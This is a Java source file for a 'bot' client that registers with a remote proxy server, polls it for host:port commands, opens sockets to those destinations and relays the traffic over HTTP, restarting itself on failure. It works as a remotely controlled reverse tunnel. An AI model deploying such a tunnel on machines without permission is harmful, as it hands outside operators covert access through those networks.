package com.bot.Thread;

import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketTimeoutException;

import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.util.EntityUtils;

import com.bot.Launcher;

public class ServerBot extends Thread {

  private String sockRestIdBackUp;
  private String proxyUrl;
  private String botName;

  public void run() {
    try {
      botInit(botName);
    } catch (Exception e1) {
      Launcher.restart();
      return;
    }
    while (!Thread.currentThread().isInterrupted()) {
      try {
        String sockRestId = null;
        if (sockRestIdBackUp != null) {
          sockRestId = sockRestIdBackUp;
        } else {
          sockRestId = botAddConnection(botName);
        }
        connectToDestination(sockRestId);
      } catch (Exception e) {
        return;
      }
    }
    Launcher.restart();
  }

  public void startServer(String proxyUrl, String botName, String sockRestIdBackUp)
      throws Exception {
    this.sockRestIdBackUp = sockRestIdBackUp;
    this.proxyUrl = proxyUrl;
    this.botName = botName;
    start();
  }

  private void botInit(String botName) throws Exception {
    HttpClient client = HttpClientBuilder.create().build();
    HttpPost post = new HttpPost(proxyUrl.concat("/botInit"));
    post.addHeader("botName", this.botName);
    HttpResponse response;
    do {
      Thread.sleep(1000);
      response = client.execute(post);
    } while (response.getStatusLine().getStatusCode() != 200);
  }

  private String botAddConnection(String botName) throws Exception {
    HttpClient client = HttpClientBuilder.create().build();
    HttpPost post = new HttpPost(proxyUrl.concat("/botAddConnection"));
    post.addHeader("botName", this.botName);
    HttpResponse response;
    do {
      Thread.sleep(1000);
      response = client.execute(post);
    } while (response.getStatusLine().getStatusCode() != 200);
    return EntityUtils.toString(response.getEntity());
  }

  private void connectToDestination(String sockRestId) {
    Socket sock = null;
    HttpClient client = HttpClientBuilder.create().build();
    HttpGet get = new HttpGet(this.proxyUrl.concat("/mirror/socketHandler"));
    get.addHeader("sockRestId", sockRestId);
    try {
      String command = "";
      HttpResponse response = null;
      while (command.equals("")) {
        Thread.sleep(1000);
        response = client.execute(get);
        if (response.getStatusLine().getStatusCode() != 200) {
          sockRestIdBackUp = null;
          return;
        }
        sockRestIdBackUp = sockRestId;
        command = EntityUtils.toString(response.getEntity());
      }
      sockRestIdBackUp = null;
      sock = openSocket(command);
      SEND send = new SEND();
      send.startSend(proxyUrl.concat("/mirror"), sock, sockRestId);
      RECV recv = new RECV();
      recv.startSend(proxyUrl.concat("/mirror"), sock, sockRestId);
    } catch (Exception e) {
      disconnectRemoteSocket(sockRestId);
      try {
        sock.close();
      } catch (Exception e2) {
      }
    }
  }

  private void disconnectRemoteSocket(String sockRestId) {
    HttpClient client = HttpClientBuilder.create().build();
    HttpPost post = new HttpPost(proxyUrl.concat("/mirror/socketControl/disconnect"));
    try {
      HttpResponse response;
      int ctry = 5;
      do {
        post.setHeader("sessionId", sockRestId);
        response = client.execute(post);
        ctry--;
        if (ctry == 0) {
          throw new Exception("out of retry");
        }
      } while (response.getStatusLine().getStatusCode() != 200);
    } catch (Exception e) {
    }
  }

  private static Socket openSocket(String command) throws Exception {
    Socket socket;
    String[] info = command.split(":");
    String host = info[0];
    int port = Integer.valueOf(info[1]);
    try {
      InetAddress inteAddress = InetAddress.getByName(host);
      SocketAddress socketAddress = new InetSocketAddress(inteAddress, port);
      socket = new Socket();
      int timeoutInMs = 10 * 1000;
      socket.connect(socketAddress, timeoutInMs);
      return socket;
    } catch (SocketTimeoutException ste) {
      ste.printStackTrace();
      throw ste;
    }
  }
}
